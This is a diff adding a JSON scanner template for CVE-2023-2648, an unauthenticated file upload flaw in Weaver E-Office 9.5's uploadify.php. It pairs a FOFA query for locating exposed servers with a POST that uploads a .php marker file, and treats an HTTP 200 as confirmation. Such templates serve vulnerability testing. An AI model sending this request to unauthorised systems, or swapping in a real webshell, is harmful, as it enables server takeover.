@@ -1,0 +1,46 @@
+{
+  "product": "泛微 E-Office",
+  "vul_name": "泛微 E-Office uploadify.php文件上传",
+  "type": "文件上传",
+  "vul_id": [
+    "cve-2023-2648"
+  ],
+  "level": 3,
+  "vul_desc": "由于泛微e-office 9.5版本源文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传，未经身份验证的恶意攻击者通过上传恶意文件，从而获取目标服务器的控制权限。",
+  "version": "泛微 E-Office 9.5",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-EOffice\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_41904294/article/details/130832416",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/inc/jquery/uploadify/uploadify.php",
+      "file": {
+        "Filedata": [
+          "52e039302a62d077.php",
+          "95cc64dd2825f9df13ec4ad683ecf339",
+          "application/octet-stream"
+        ],
+        "file": [
+          "",
+          "",
+          "application/octet-stream"
+        ]
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200
+        }
+      ]
+    }
+  }
+}
